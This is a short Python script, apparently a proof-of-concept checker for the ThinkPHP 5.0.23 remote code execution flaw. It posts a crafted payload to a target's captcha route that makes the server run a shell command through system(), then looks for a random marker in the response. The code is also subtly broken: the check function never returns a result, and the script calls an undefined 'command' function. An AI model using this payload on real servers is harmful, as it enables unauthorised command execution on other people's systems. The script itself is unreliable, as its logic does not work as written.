# coding=utf-8
import random,sys

#from lib.Requests import Requests
import requests
vuln = ['ThinkPHP', 'ThinkSNS']
random_num = ''.join(str(i) for i in random.sample(range(0, 9), 8))

print('[*]Usage: [URL]')
def check(url):
    #req = Requests()
    payload = r'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "{}"'.format(random_num)
    try:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        r = requests.post(url + '/index.php?s=captcha', data=payload, headers=headers, verify=False)
        if random_num in r.text:
            print('[+]thinkphp_5_0_23_rce | ' + url)
        else:
            print('[-]target is not vulnerable')
    except Exception as e:
        print("异常对象的内容是%s"%e)

if __name__ == '__main__':
    url = sys.argv[1]
    name = check(url)
    if name:
        print("[+] Remote code execution vulnerability exists at the target address")
        command(url,name)
    else:
        print("[-] There is no remote code execution vulnerability in the target address")
